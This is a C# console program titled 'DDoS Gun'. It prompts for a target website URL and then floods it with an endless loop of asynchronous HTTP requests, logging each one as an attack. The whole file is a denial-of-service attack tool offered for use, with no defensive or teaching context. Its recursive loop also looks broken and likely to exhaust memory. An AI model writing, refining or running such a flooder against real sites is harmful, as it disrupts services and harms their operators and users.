using System;
using System.Net;

namespace ddos
{
    internal class Program
    {
        private static string _url;
        public string Url
        {
            get { return _url; }
            set { _url = value; }
        }

        private static void Main(string[] args)
        {
            Console.CancelKeyPress += ConsoleOnCancelKeyPress;
            Console.Title = "DDoS Gun";

            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine(@"DDOS Power Gun
              _=__________________________-   
             /  ////  (___)REMENBERING_____|   
            |_|_////______S_A_D_E_E_P_A___|     
                )/  o  /) /  )/ 
               (/     /) _'_)
              (/     /)
             (/     /)
            (/_ o _/)
           (--------)");

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(
@"Fundamental script by sadeepa
Devaloped by lakmal");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("Enter Site URL : - (Example - http://abcdefghilkl.com or host name )\n >");
            var sw2 = args.Length > 0 ? args[0] : Console.ReadLine();

            if (!string.IsNullOrEmpty(sw2))
            {
                _url = sw2;
                N();
            }
            Console.ResetColor();
        }

        private static void ConsoleOnCancelKeyPress(object sender, ConsoleCancelEventArgs e)
        {
            switch (e.SpecialKey)
            {
                case ConsoleSpecialKey.ControlC:
                    N(false);
                    Console.WriteLine("Attack terminated by user\n >");
                    break;
                //Console.ReadLine();
                case ConsoleSpecialKey.ControlBreak:
                    N(false);
                    Console.WriteLine("Attack terminated by user\n >");
                    break;
            }
        }

        private static void N(bool start = true)
        {
            if (start)
            {
                if (string.IsNullOrEmpty(_url)) return;
                if (_url.Equals("about:blank")) return;
                if (!_url.StartsWith("http://") && !_url.StartsWith("https://"))
                {
                    _url = "http://" + _url;
                }

                Console.Title = "Attacking to " + _url;
                Console.WriteLine("Current url is " + _url);
                try
                {
                    int i = 0;
                    while (true)
                    {
                        var client = new WebClient();

                        client.DownloadStringAsync(new Uri(_url));
                        Console.WriteLine("sending to " + _url + " " + i);
                        client.Dispose();
                        N();
                        i++;
                    }
                }
                catch (InsufficientMemoryException iex)
                {
                    Console.WriteLine(iex.Message);
                    Console.WriteLine(iex.StackTrace);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    Console.WriteLine(ex.StackTrace);
                }
            }
        }
    }
}
